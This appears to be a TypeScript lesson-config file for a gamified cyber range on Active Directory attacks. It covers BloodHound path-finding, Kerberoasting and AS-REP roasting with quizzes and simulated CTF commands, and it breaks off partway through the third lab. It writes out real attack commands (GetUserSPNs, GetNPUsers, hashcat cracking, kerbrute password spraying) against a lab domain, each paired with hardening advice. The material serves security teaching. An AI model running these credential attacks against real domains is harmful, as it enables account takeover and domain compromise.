import type { EpochConfig, StageConfig } from "./types";

// ── Cyber Range: Active Directory Attacks ────────────────────────────────────
// The enterprise identity backbone: BloodHound attack-path analysis, Kerberoasting,
// AS-REP roasting, and domain dominance (DCSync + golden ticket). Simulated faithful
// tooling; every attack pairs with the AD-hardening defense. Public sources
// (SpecterOps/BloodHound, MITRE ATT&CK, Microsoft AD security docs).

export const rangeAdEpoch: EpochConfig = {
  id: "range-ad",
  name: "Active Directory Attacks",
  subtitle: "BloodHound, Kerberoasting, and the path to Domain Admin",
  description:
    "Active Directory runs the enterprise — and it's the red team's main event. Learn AD attack-path analysis with BloodHound, abuse Kerberos with Kerberoasting and AS-REP roasting, and achieve domain dominance with DCSync and golden tickets — each paired with the AD-hardening defense.",
  emoji: "🏰",
  color: "Blue",
  unlocked: true,
};

const dom = (vuln: string) => ({ ip: "10.10.20.10", hostname: "corp-dc", os: "Windows Server 2019 (CORP.LOCAL domain controller)", openPorts: "88 (Kerberos), 389/636 (LDAP), 445 (SMB)", vulnerability: vuln });

export const rangeAdStages: StageConfig[] = [
  // ─── Lab 1: BloodHound ──────────────────────────────────────────────────────
  {
    epochId: "range-ad",
    wonder: { name: "The Attack Graph", location: "Authorized AD Engagement", era: "Present Day", emoji: "🩸" },
    id: "ad-01",
    order: 1,
    title: "AD Enumeration: BloodHound",
    subtitle: "Find the shortest path to Domain Admin",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-ad-bloodhound", name: "Path Finder", emoji: "🩸" },
    challengeType: "ctf",
    info: {
      tagline: "Active Directory is a graph of who-can-do-what — and BloodHound finds the shortest path from any user to Domain Admin.",
      year: 2016,
      overview: [
        "Active Directory is the identity and access backbone of most enterprises, and its complexity is its weakness. A single domain interlinks:\n- thousands of users and groups\n- nested memberships\n- access-control entries\n- live sessions\n- delegations\nTogether these create an enormous, tangled web of privilege relationships that no admin can reason about by hand. Attackers exploit exactly that. BloodHound, released by SpecterOps in 2016, collects this data with a 'SharpHound' collector and loads it into a Neo4j graph database, then answers the question that matters: what is the shortest path from the low-privilege account I just compromised to Domain Admin? It turns AD privilege into a map you can query.",
        "The paths BloodHound surfaces are the AD attack catalog:\n- nested group memberships that quietly grant admin\n- dangerous ACLs (GenericAll, WriteDACL, ForceChangePassword) that let one principal control another\n- sessions where a privileged user is logged into a machine you control, so you can steal their credentials\n- Kerberos delegation that can be abused\nIts 'pre-built queries' literally include 'Shortest Path to Domain Admins.' Critically, BloodHound is dual-use and arguably more valuable to defenders: blue teams run it to find and remove these attack paths before an attacker walks them. The defensive program is attack-path management — tier your admin model so high-privilege accounts never log into low-trust machines, enforce least privilege, strip dangerous ACLs, and re-run BloodHound to verify the paths are gone.",
      ],
      technical: {
        title: "Graphing the Domain",
        body: [
          "Collection + analysis:\n- SharpHound (or BloodHound.py / the AzureHound for Entra) collects users, groups, ACLs, sessions, GPOs, trusts.\n- Load into BloodHound (Neo4j) → an interactive graph of principals + the rights between them.\n- Pre-built queries: 'Shortest Path to Domain Admins', 'Find Principals with DCSync Rights', etc.",
          "The edges (attack primitives) it reveals:\n- MemberOf — nested group membership that grants effective admin.\n- GenericAll / WriteDACL / Owns / ForceChangePassword — ACL abuse: control another principal/object.\n- HasSession — a privileged user logged into a machine you control → steal their creds.\n- CanRDP / AllowedToDelegate / AddMember — lateral + escalation edges.",
          "The defense (attack-path management):\n- Tiered administration: Tier-0 (DA/DC) accounts NEVER log into Tier-1/2 machines (kills HasSession paths).\n- Least privilege; remove dangerous ACLs (GenericAll/WriteDACL) and unnecessary nesting.\n- Run BloodHound defensively + tools like 'BloodHound Enterprise' to track + close paths over time.\n- Protected Users group, LAPS, and credential hygiene shrink the graph.",
        ],
        codeExample: {
          label: "Collect, then query the path to DA",
          code: `# Collect AD data from a low-priv foothold
PS> .\\SharpHound.exe -c All           # or: bloodhound-python -d corp.local -u bob -p ...

# In BloodHound (Neo4j) — run the pre-built query:
#   "Shortest Path to Domain Admins" starting from BOB@CORP.LOCAL
BOB --MemberOf--> HELPDESK
HELPDESK --GenericAll--> SVC_SQL          # ACL abuse: reset its password
SVC_SQL --HasSession--> WS01 (DA logged in)  # steal the DA's creds
=> path to DOMAIN ADMINS found (3 hops)

# THE FIX: tier admin (no DA sessions on low-trust hosts), strip GenericAll`,
        },
      },
      incident: {
        title: "BloodHound — Making AD Attack Paths Visible",
        when: "2016 (release) → standard in every AD engagement",
        where: "Active Directory environments worldwide",
        impact: "Revealed that almost every large AD has a short, walkable path from a normal user to Domain Admin",
        body: [
          "BloodHound changed AD security overnight by making the invisible visible: it demonstrated that nearly every large, organically-grown Active Directory contains short attack paths — three or four hops — from an ordinary user to Domain Admin, hiding in nested groups, forgotten ACLs, and privileged sessions on ordinary workstations. What had been an intractable mental exercise became a graph query, and red teams adopted it universally.",
          "The defensive response is attack-path management, and it's why BloodHound is as much a blue-team tool: you can only fix paths you can see. Tiering the administrative model (so Domain Admin credentials never touch a workstation an attacker can compromise), enforcing least privilege, and stripping dangerous ACLs collapses the graph. The lesson is structural — AD security isn't about one vulnerability, it's about the shape of the privilege graph, and BloodHound is how both sides read it.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Low-priv user (BOB)", sub: "SharpHound collect", type: "attacker" },
          { label: "AD privilege graph", sub: "groups/ACLs/sessions", type: "system" },
          { label: "Shortest path query", sub: "ACL abuse + session theft", type: "victim" },
          { label: "Domain Admins", sub: "→ fix: tier + strip ACLs", type: "result" },
        ],
      },
      timeline: [
        { year: 2016, event: "SpecterOps releases BloodHound", highlight: true },
        { year: 2019, event: "Attack-path management becomes a defensive discipline" },
        { year: 2022, event: "BloodHound CE + Entra ID (Azure) path analysis" },
      ],
      keyTakeaways: [
        "AD is a graph of privilege relationships too complex to reason about by hand",
        "BloodHound (SharpHound collector → Neo4j) finds the shortest path from any user to Domain Admin",
        "Attack edges: nested MemberOf, ACL abuse (GenericAll/WriteDACL), HasSession (credential theft), delegation",
        "It's dual-use: defenders run it to find and remove attack paths first",
        "Fix is attack-path management: tiered admin (no DA sessions on low-trust hosts), least privilege, strip dangerous ACLs",
      ],
      references: [
        { title: "BloodHound — SpecterOps", url: "https://bloodhound.specterops.io/" },
        { title: "Microsoft — Securing Privileged Access (tiering)", url: "https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview" },
      ],
    },
    quiz: {
      questions: [
        { id: "ad-01-q1", type: "Concept", challenge: "Why AD is hard.", text: "Why is Active Directory privilege hard to reason about manually?", options: ["It's an enormous graph of nested groups, ACLs, sessions, and delegations", "It uses no permissions", "It's encrypted end to end", "It has only one user"], correctIndex: 0, explanation: "The tangled privilege graph hides escalation paths." },
        { id: "ad-01-q2", type: "Tool", challenge: "What it does.", text: "What does BloodHound do?", options: ["Graphs AD relationships and finds the shortest path to Domain Admin", "Cracks Kerberos tickets", "Scans ports", "Encrypts the domain"], correctIndex: 0, explanation: "It maps privilege and queries attack paths." },
        { id: "ad-01-q3", type: "Collector", challenge: "Get the data.", text: "What collects the AD data BloodHound analyzes?", options: ["SharpHound (or BloodHound.py)", "nmap", "Hydra", "sqlmap"], correctIndex: 0, explanation: "SharpHound enumerates AD and feeds BloodHound." },
        { id: "ad-01-q4", type: "Edge", challenge: "ACL abuse.", text: "What does a GenericAll edge on another principal allow?", options: ["Full control over it (e.g. reset its password) — ACL abuse", "Nothing", "Only reading its name", "Encrypting it"], correctIndex: 0, explanation: "GenericAll = full control, a direct takeover primitive." },
        { id: "ad-01-q5", type: "Edge", challenge: "Sessions.", text: "Why is a privileged user's HasSession on a machine you control valuable?", options: ["You can steal that user's credentials from the machine", "It logs you out", "It patches the host", "It's irrelevant"], correctIndex: 0, explanation: "A DA session on a compromised host means DA credential theft." },
        { id: "ad-01-q6", type: "Dual Use", challenge: "Blue team.", text: "How do defenders use BloodHound?", options: ["To find and remove attack paths before attackers walk them", "To attack other companies", "It's offense-only", "To crack passwords"], correctIndex: 0, explanation: "You can only fix paths you can see — defenders map them too." },
        { id: "ad-01-q7", type: "Defense", challenge: "Tiering.", text: "What does a tiered admin model prevent?", options: ["Domain Admin credentials being exposed on low-trust machines (kills HasSession paths)", "All logins", "DNS", "Patching"], correctIndex: 0, explanation: "Tier-0 accounts never touch Tier-1/2 hosts, removing those paths." },
        { id: "ad-01-q8", type: "Mindset", challenge: "The lesson.", text: "What does BloodHound teach about AD security?", options: ["It's about the shape of the privilege graph, not one vulnerability", "It's about passwords only", "AD can't be secured", "It's about ports"], correctIndex: 0, explanation: "Attack-path management addresses the structure, not a single bug." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.20.50", hostname: "ws-bob", os: "Windows 10 (domain user BOB@CORP.LOCAL)" },
      targetMachine: dom("short BloodHound attack path from a normal user to Domain Admins"),
      scenario: "You compromised a normal domain user (BOB) on CORP.LOCAL. Collect AD data with SharpHound, load it in BloodHound, and find the shortest attack path from BOB to Domain Admins.",
      hint: "Run the collector, then run the 'Shortest Path to Domain Admins' query from BOB.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Collect AD data. Run: sharphound-collect",
        "Find the path to Domain Admins. Run: bloodhound-path BOB",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{BL00DH0UND_", label: "BloodHound Briefing" },
        { trigger: "sharphound-collect", value: "P4TH_", label: "AD Data Collected" },
        { trigger: "bloodhound-path BOB", value: "T0_D4}", label: "Path to Domain Admin Found" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — AD LAB 1: BLOODHOUND (you are BOB@CORP.LOCAL, normal user)",
          "Goal: collect AD, find the shortest path to Domain Admins.",
          "Sequence: sharphound-collect -> bloodhound-path BOB -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "sharphound-collect": (_args: string[]) => ({
          lines: [
            "PS> .\\SharpHound.exe -c All -d corp.local",
            "  [+] enumerated 1,204 users, 318 groups, 47 computers, 9,882 ACLs",
            "  [+] sessions + delegations collected -> 20240613.zip",
            "  [+] imported into BloodHound (Neo4j)",
            "",
            ">> LEARN: SharpHound maps the whole privilege graph in one pass",
            "   Now query it instead of guessing. Fragment collected.",
          ],
        }),
        "bloodhound-path": (args: string[]) => {
          if (String(args[0] || "").toUpperCase() !== "BOB") return { lines: ["Usage: bloodhound-path BOB"] };
          return {
            lines: [
              "[BloodHound] Shortest Path to Domain Admins from BOB@CORP.LOCAL:",
              "  BOB --MemberOf--> HELPDESK",
              "  HELPDESK --GenericAll--> SVC_SQL        (ACL abuse: reset its password)",
              "  SVC_SQL --HasSession--> WS01            (DA 'alice' logged in here!)",
              "  WS01 --> steal alice's creds --> DOMAIN ADMINS",
              "  => 3 hops to Domain Admin.",
              "",
              ">> LEARN: nested group + ACL abuse + a DA session = a short path to DA",
              ">> BLUE TEAM: tier admin (no DA on WS01), strip HELPDESK's GenericAll.",
              "   Run 'assemble' to view the flag and the submit command.",
            ],
          };
        },
      },
    },
  },

  // ─── Lab 2: Kerberoasting ───────────────────────────────────────────────────
  {
    epochId: "range-ad",
    wonder: { name: "The Service Ticket", location: "Authorized AD Engagement", era: "Present Day", emoji: "🎫" },
    id: "ad-02",
    order: 2,
    title: "Kerberoasting",
    subtitle: "Any user can roast a service account's password",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-ad-kerberoast", name: "Kerberoaster", emoji: "🎫" },
    challengeType: "ctf",
    info: {
      tagline: "Kerberos will hand any domain user a service ticket encrypted with the service account's password — so request it and crack it offline.",
      year: 2014,
      overview: [
        "Kerberoasting is one of the most reliable AD attacks because it abuses Kerberos working as designed. Service accounts in AD are identified by a Service Principal Name (SPN), and Kerberos lets any authenticated domain user request a service ticket (TGS) for any SPN. The catch that makes it an attack: that ticket is encrypted with the service account's password hash. So a low-privilege user simply requests TGS tickets for the SPNs they want, extracts the encrypted portion, and cracks it offline with Hashcat — no elevated rights, no touching the target service, no lockout. Because service accounts frequently have weak, human-set, never-rotated passwords and often hold high privileges, Kerberoasting routinely yields a powerful account from an ordinary foothold.",
        "The mechanics are clean: `GetUserSPNs` (Impacket) or Rubeus enumerates SPNs and requests the tickets, you get a `$krb5tgs$` hash per service account, and Hashcat mode 13100 cracks the ones with weak passwords. It's quiet on the wire (just normal Kerberos traffic) and needs only valid domain credentials. The defenses target the password and the monitoring: use long, random service-account passwords — ideally Group Managed Service Accounts (gMSA), which auto-rotate 120-character passwords no human ever sees — apply least privilege so a cracked service account isn't powerful, enforce AES Kerberos encryption (RC4 tickets crack faster), and monitor for TGS-REQ bursts (event 4769), especially requests using RC4 or for many SPNs, which is the Kerberoasting signature.",
      ],
      technical: {
        title: "Kerberoasting Mechanics",
        body: [
          "The attack (any domain user, no special rights):\n- Enumerate SPNs: GetUserSPNs.py corp.local/bob:pass (Impacket) or Rubeus kerberoast.\n- Request a TGS for each SPN → get the $krb5tgs$ hash (encrypted with the service account's password).\n- Crack offline: hashcat -m 13100 spns.txt rockyou.txt -r rules.\n- A cracked service account is often high-privileged → escalation.",
          "Why it works (Kerberos by design):\n- Any authenticated user may request a TGS for any SPN — that's how Kerberos services work.\n- The ticket is encrypted with the service account's NTLM/AES key (its password).\n- Service-account passwords are often weak, human-set, and never rotated.\n- Quiet: it's just normal Kerberos traffic; no lockout; no target interaction.",
          "The defenses (password + crypto + monitoring):\n- gMSA / dMSA — auto-rotated 120-char service-account passwords no human knows (the best fix).\n- Long random passwords + least privilege for any non-gMSA service account.\n- Enforce AES (disable RC4) — RC4 tickets crack much faster.\n- Monitor event 4769 for TGS-REQ bursts / RC4 / many-SPN requests (the Kerberoast signature).",
        ],
        codeExample: {
          label: "Roast SPNs, crack offline",
          code: `# Any domain user requests service tickets and dumps the hashes
$ GetUserSPNs.py corp.local/bob:Spring2024! -dc-ip 10.10.20.10 -request
  ServicePrincipalName     Name       MemberOf
  MSSQLSvc/sql01:1433       svc_sql    Domain Admins (!)
  $krb5tgs$23$*svc_sql*... (the crackable hash)

# Crack offline — no lockout, no target interaction
$ hashcat -m 13100 spns.txt rockyou.txt -r best64.rule
  svc_sql:$krb5tgs$...:Summer2023!     # cracked -> a Domain Admin service acct

# THE FIX: gMSA (auto-rotated 120-char pw); AES only; monitor 4769`,
        },
      },
      incident: {
        title: "Kerberoasting — Abusing Kerberos By Design",
        when: "2014 (Tim Medin's disclosure) → a top AD technique ever since",
        where: "Active Directory environments with SPN service accounts",
        impact: "A low-priv user routinely cracks a high-privilege service account — a workhorse escalation",
        body: [
          "Tim Medin introduced Kerberoasting at DerbyCon 2014, and it has been a staple of real intrusions and red teams ever since because it exploits a feature, not a bug: Kerberos must let users request service tickets, and those tickets must be encrypted with the service's key. The weakness is human — service accounts with weak, static passwords — and the impact is large because those accounts are often over-privileged.",
          "The defense is equally well-established: Group Managed Service Accounts solve it almost entirely by removing the human-chosen password (120-character, auto-rotated, never known to anyone), and where gMSA can't be used, long random passwords plus least privilege plus AES-only encryption plus 4769 monitoring contain it. Kerberoasting is the clearest illustration that AD security is often about credential hygiene for service accounts, the most neglected identities in the domain.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Any domain user", sub: "request TGS for SPNs", type: "attacker" },
          { label: "Kerberos (by design)", sub: "TGS encrypted w/ svc pw", type: "system" },
          { label: "Offline crack (Hashcat)", sub: "weak service password", type: "victim" },
          { label: "Privileged service acct", sub: "→ fix: gMSA + AES + monitor", type: "result" },
        ],
      },
      timeline: [
        { year: 2014, event: "Tim Medin presents Kerberoasting at DerbyCon", highlight: true },
        { year: 2017, event: "gMSA adoption pushed as the structural fix" },
        { year: 2021, event: "AES-only + 4769 monitoring become standard mitigations" },
      ],
      keyTakeaways: [
        "Kerberos lets any domain user request a service ticket (TGS) for any SPN",
        "The TGS is encrypted with the service account's password hash → crack it offline (Hashcat -m 13100)",
        "No special rights, no target interaction, no lockout — and service accounts are often weak + over-privileged",
        "The signature is a TGS-REQ burst (event 4769), especially RC4 or many SPNs",
        "Fix: gMSA (auto-rotated 120-char passwords), long random passwords + least privilege, AES-only, monitor 4769",
      ],
      references: [
        { title: "MITRE ATT&CK — Kerberoasting (T1558.003)", url: "https://attack.mitre.org/techniques/T1558/003/" },
        { title: "Microsoft — Group Managed Service Accounts (gMSA)", url: "https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" },
      ],
    },
    quiz: {
      questions: [
        { id: "ad-02-q1", type: "Concept", challenge: "What it abuses.", text: "Kerberoasting abuses which Kerberos behavior?", options: ["Any user can request a TGS for any SPN, encrypted with the service account's password", "Pre-auth bypass", "DCSync", "NTLM relay"], correctIndex: 0, explanation: "The TGS encrypted with the service key is the crackable artifact." },
        { id: "ad-02-q2", type: "SPN", challenge: "Identifier.", text: "What identifies a Kerberoastable service account?", options: ["A Service Principal Name (SPN)", "A MAC address", "An IP", "A GPO"], correctIndex: 0, explanation: "Accounts with SPNs can be roasted." },
        { id: "ad-02-q3", type: "Rights", challenge: "What you need.", text: "What privileges does Kerberoasting require?", options: ["Just valid domain credentials (any user)", "Domain Admin", "Local admin on the DC", "Physical access"], correctIndex: 0, explanation: "Any authenticated user can request the tickets." },
        { id: "ad-02-q4", type: "Crack", challenge: "Offline.", text: "How is the roasted ticket cracked?", options: ["Offline with Hashcat (mode 13100) against a wordlist", "Online brute force", "It can't be cracked", "By DCSync"], correctIndex: 0, explanation: "The $krb5tgs$ hash is cracked offline." },
        { id: "ad-02-q5", type: "Stealth", challenge: "Quiet.", text: "Why is Kerberoasting stealthy?", options: ["It's normal Kerberos traffic, no lockout, no target interaction", "It deletes logs", "It uses MFA", "It reboots the DC"], correctIndex: 0, explanation: "The request looks like legitimate service usage." },
        { id: "ad-02-q6", type: "Impact", challenge: "Why valuable.", text: "Why is a cracked service account often powerful?", options: ["Service accounts frequently have weak passwords AND high privileges", "They are always Guests", "They can't log in", "They are random"], correctIndex: 0, explanation: "Over-privileged, weakly-secured service accounts are common." },
        { id: "ad-02-q7", type: "Defense", challenge: "Best fix.", text: "What largely eliminates Kerberoasting risk?", options: ["gMSA — auto-rotated 120-char service-account passwords", "A shorter password", "Disabling Kerberos", "Opening more ports"], correctIndex: 0, explanation: "gMSA removes the human-chosen, crackable password." },
        { id: "ad-02-q8", type: "Detection", challenge: "The signature.", text: "What event signals Kerberoasting?", options: ["A burst of TGS-REQ (event 4769), especially RC4 or many SPNs", "A single login", "A DNS query", "High RAM"], correctIndex: 0, explanation: "Mass/RC4 TGS requests are the Kerberoast tell." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.20.50", hostname: "ws-bob", os: "Windows 10 (domain user BOB)" },
      targetMachine: dom("Kerberoastable service account svc_sql with a weak password (and DA membership)"),
      scenario: "As the domain user BOB on CORP.LOCAL, enumerate service accounts (SPNs), request their tickets, and crack a weak service-account password offline — landing a Domain Admin service account.",
      hint: "Request the SPN tickets, then crack the $krb5tgs$ hash with Hashcat.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "Request service tickets for SPNs. Run: kerberoast",
        "Crack the roasted hash offline. Run: crack-tgs",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{K3RB3R04ST_", label: "Kerberoast Briefing" },
        { trigger: "kerberoast", value: "SPN_", label: "Service Tickets Requested" },
        { trigger: "crack-tgs", value: "CR4CK3D}", label: "Service Account Cracked" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — AD LAB 2: KERBEROASTING (you are BOB@CORP.LOCAL)",
          "Goal: roast SPNs, crack a weak service-account password.",
          "Sequence: kerberoast -> crack-tgs -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "kerberoast": (_args: string[]) => ({
          lines: [
            "$ GetUserSPNs.py corp.local/bob:Spring2024! -dc-ip 10.10.20.10 -request",
            "  SPN                    Account    MemberOf",
            "  MSSQLSvc/sql01:1433    svc_sql    Domain Admins (!)",
            "  HTTP/web01             svc_web    Web Operators",
            "  -> $krb5tgs$23$*svc_sql*... (crackable hash dumped)",
            "",
            ">> LEARN: any domain user can request these — the ticket carries the svc password",
            "   svc_sql is a Domain Admin. Fragment collected.",
          ],
        }),
        "crack-tgs": (_args: string[]) => ({
          lines: [
            "$ hashcat -m 13100 spns.txt rockyou.txt -r best64.rule",
            "  $krb5tgs$...svc_sql...:Summer2023!     <-- CRACKED",
            "  svc_web:$krb5tgs$... : (exhausted — strong password, safe)",
            "  -> svc_sql / Summer2023!  =  a DOMAIN ADMIN service account",
            "",
            ">> LEARN: weak, never-rotated service-account password = Domain Admin",
            ">> BLUE TEAM: gMSA (auto 120-char pw), AES-only, least priv; monitor 4769.",
            "   Run 'assemble' to view the flag and the submit command.",
          ],
        }),
      },
    },
  },

  // ─── Lab 3: AS-REP roasting + spraying ──────────────────────────────────────
  {
    epochId: "range-ad",
    wonder: { name: "The Missing Pre-Auth", location: "Authorized AD Engagement", era: "Present Day", emoji: "🔓" },
    id: "ad-03",
    order: 3,
    title: "AS-REP Roasting & AD Password Attacks",
    subtitle: "Roast accounts with no pre-auth — and spray the domain",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "badge-ad-asrep", name: "Roaster", emoji: "🔓" },
    challengeType: "ctf",
    info: {
      tagline: "Some accounts let you skip Kerberos pre-authentication — so you can roast their password hash without any credentials at all.",
      year: 2017,
      overview: [
        "AS-REP roasting is Kerberoasting's even-easier cousin: it targets accounts configured with 'Do not require Kerberos pre-authentication.' Normally, Kerberos pre-authentication forces a user to prove they know their password before the Key Distribution Center responds — but when pre-auth is disabled, anyone can request an authentication response (AS-REP) for that account, and a portion of that response is encrypted with the user's password hash. So you can roast the hash and crack it offline without any credentials at all — you just need to know (or enumerate) the username. Accounts get this flag set for legacy app compatibility, and they're a free escalation when present.",
        "Alongside roasting, AD is a prime target for the password attacks from the Password epoch, now domain-aware. Password spraying against AD (one common password across all enumerated domain users) is a top initial-access and escalation technique, dodging lockout by trying few attempts per account; tools like Kerbrute spray quietly over Kerberos. Both AS-REP roasting and spraying share the same defenses: require Kerberos pre-authentication on every account (audit for the 'DONT_REQUIRE_PREAUTH' flag and remove it), enforce strong/long passwords and ban breached ones, deploy MFA so a cracked or sprayed password isn't sufficient, set sane lockout policies, and monitor for the tell-tale patterns — AS-REQs without pre-auth, and many-accounts-one-password authentication bursts. As ever, the offensive techniques map directly to a prioritized hardening checklist.",
      ],
      technical: {
        title: "AS-REP Roasting + Domain Spraying",
        body: [
          "AS-REP roasting (no credentials needed):\n- Find accounts with 'Do not require pre-auth': GetNPUsers.py corp.local/ -usersfile users.txt (Impacket) or Rubeus asreproast.\n- Get the $krb5asrep$ hash → crack offline: hashcat -m 18200 rockyou.txt.\n- You only need a valid username list (enumerable via Kerbrute, LDAP, OSINT).",
          "Domain password spraying:\n- Enumerate users (Kerbrute userenum / LDAP), then spray one common password.\n- Kerbrute passwordspray users.txt 'Spring2024!' — quiet, over Kerberos.\n- Few attempts per account → dodges lockout; SOMEONE in a big domain reused it.",
          "Shared defenses (pre-auth + passwords + MFA + monitoring):\n- Require Kerberos pre-auth everywhere; audit + remove DONT_REQUIRE_PREAUTH flags.\n- Strong/long passwords + ban breached; MFA so a cracked/sprayed password is insufficient.\n- Sane lockout; monitor AS-REQ-without-preauth and many-accounts-one-password bursts (4768/4771).",
        ],
        codeExample: {
          label: "AS-REP roast + spray",
          code: `# AS-REP roast — no creds, just usernames (accounts w/o pre-auth)
$ GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.20.10
  [+] svc_legacy has 'Do not require pre-auth' set
  $krb5asrep$23$svc_legacy@CORP.LOCAL:...    # crackable, no credentials used
$ hashcat -m 18200 asrep.txt rockyou.txt     # -> svc_legacy:Welcome2022

# Spray one common password across the domain (dodges lockout)
$ kerbrute passwordspray -d corp.local users.txt 'Spring2024!'
  [+] VALID: rjones@corp.local : Spring2024!

# THE FIX: require pre-auth, ban breached pw, MFA, lockout, monitor 4768/4771`,
        },
      },
      incident: {
        title: "The Forgotten Flag — Legacy Pre-Auth Settings",
        when: "AS-REP roasting popularized ~2017; pre-auth flag predates it by decades",
        where: "AD accounts left with pre-authentication disabled for legacy compatibility",
        impact: "Credential-free hash recovery for any account missing pre-authentication",
        body: [
          "AS-REP roasting endures because the 'Do not require Kerberos pre-authentication' flag gets set for old applications and then forgotten, leaving accounts that anyone can roast without authenticating at all. Combined with password spraying — which exploits the same human reuse the Password epoch covered, now across a whole directory — these are among the most common AD initial-access and escalation paths in real engagements and breaches.",
          "The fixes are an audit and a policy: find and clear the pre-auth flags (it's a single LDAP query), require strong passwords and MFA, set lockout thresholds, and monitor Kerberos authentication for the signatures. Every technique in this lab maps to a control, reinforcing the epoch's theme — AD attacks are largely the failure of credential hygiene and default-configuration discipline, and they're fixed by the same.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "AS-REP roast / spray", type: "attacker" },
          { label: "No pre-auth / reused pw", sub: "the misconfiguration", type: "system" },
          { label: "Offline crack / valid login", sub: "no lockout", type: "victim" },
          { label: "Foothold / escalation", sub: "→ fix: pre-auth + MFA", type: "result" },
        ],
      },
      timeline: [
        { year: 1999, event: "Kerberos pre-auth flag exists (legacy compat option)" },
        { year: 2017, event: "AS-REP roasting popularized (Rubeus/Impacket)", highlight: true },
        { year: 2020, event: "Kerbrute makes quiet domain spraying standard" },
      ],
      keyTakeaways: [
        "AS-REP roasting targets accounts with 'Do not require pre-auth' — roast the hash with NO credentials",
        "Crack the $krb5asrep$ hash offline (Hashcat -m 18200); you only need a username list",
        "Domain password spraying (one password, all users) dodges lockout and is a top AD access path",
        "Kerbrute enumerates users and sprays quietly over Kerberos",
        "Fix: require pre-auth everywhere, strong passwords + ban breached, MFA, lockout, monitor 4768/4771",
      ],
      references: [
        { title: "MITRE ATT&CK — AS-REP Roasting (T1558.004)", url: "https://attack.mitre.org/techniques/T1558/004/" },
        { title: "Kerbrute — GitHub", url: "https://github.com/ropnop/kerbrute" },
      ],
    },
    quiz: {
      questions: [
        { id: "ad-03-q1", type: "Concept", challenge: "The target.", text: "What does AS-REP roasting target?", options: ["Accounts with 'Do not require Kerberos pre-authentication'", "All service accounts", "The DC's kernel", "Open ports"], correctIndex: 0, explanation: "Disabled pre-auth lets you roast the AS-REP without credentials." },
        { id: "ad-03-q2", type: "Rights", challenge: "Creds needed.", text: "What credentials does AS-REP roasting require?", options: ["None — just a valid username list", "Domain Admin", "Local admin", "A service ticket"], correctIndex: 0, explanation: "No credentials are needed when pre-auth is disabled." },
        { id: "ad-03-q3", type: "Crack", challenge: "The mode.", text: "How is the AS-REP hash cracked?", options: ["Offline with Hashcat (mode 18200)", "Online only", "It can't be", "By DCSync"], correctIndex: 0, explanation: "$krb5asrep$ cracks offline at mode 18200." },
        { id: "ad-03-q4", type: "Spray", challenge: "Domain-wide.", text: "What is AD password spraying?", options: ["One common password tried across all enumerated domain users", "Many passwords on one account", "Offline cracking", "A DoS"], correctIndex: 0, explanation: "Spraying spreads attempts to dodge lockout." },
        { id: "ad-03-q5", type: "Tool", challenge: "Quiet spray.", text: "What does Kerbrute do?", options: ["Enumerate users and spray passwords quietly over Kerberos", "Scan ports", "Sniff traffic", "Patch the DC"], correctIndex: 0, explanation: "Kerbrute does Kerberos-based user enum + spraying." },
        { id: "ad-03-q6", type: "Why Set", challenge: "The flag.", text: "Why do accounts end up with pre-auth disabled?", options: ["Set for legacy app compatibility and then forgotten", "It's the secure default", "MFA requires it", "Random chance"], correctIndex: 0, explanation: "Legacy compatibility leaves the dangerous flag set." },
        { id: "ad-03-q7", type: "Defense", challenge: "Roasting fix.", text: "What stops AS-REP roasting?", options: ["Require Kerberos pre-authentication (audit + remove the flag)", "Disable Kerberos", "Shorter passwords", "Open more ports"], correctIndex: 0, explanation: "Requiring pre-auth removes the roastable artifact." },
        { id: "ad-03-q8", type: "Defense", challenge: "Shared control.", text: "Which control most blunts BOTH roasting and spraying?", options: ["MFA + strong/breached-banned passwords", "A longer username", "Disabling logging", "More open ports"], correctIndex: 0, explanation: "MFA + password hygiene make a cracked/sprayed password insufficient." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.20.50", hostname: "ws-attacker", os: "Linux (username list only)" },
      targetMachine: dom("an account with pre-auth disabled (svc_legacy) + reused domain passwords"),
      scenario: "You have a list of CORP.LOCAL usernames but NO credentials. Find an account with pre-authentication disabled, AS-REP roast it, and crack the hash offline to get your first valid credential.",
      hint: "Roast accounts without pre-auth using just the username list, then crack the AS-REP hash.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "AS-REP roast accounts without pre-auth. Run: asrep-roast",
        "Crack the AS-REP hash offline. Run: crack-asrep",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{ASR3P_", label: "AS-REP Briefing" },
        { trigger: "asrep-roast", value: "N0_PR34UTH_", label: "Roastable Account Found" },
        { trigger: "crack-asrep", value: "R04ST3D}", label: "Credential Recovered" },
      ],
      files: {
        "/briefing.txt": [
          "RANGE — AD LAB 3: AS-REP ROASTING (you have usernames, NO creds)",
          "Goal: roast an account without pre-auth, crack it for a foothold.",
          "Sequence: asrep-roast -> crack-asrep -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "asrep-roast": (_args: string[]) => ({
          lines: [
            "$ GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.20.10",
            "  [-] alice : pre-auth required (safe)",
            "  [+] svc_legacy : 'Do not require pre-auth' SET",
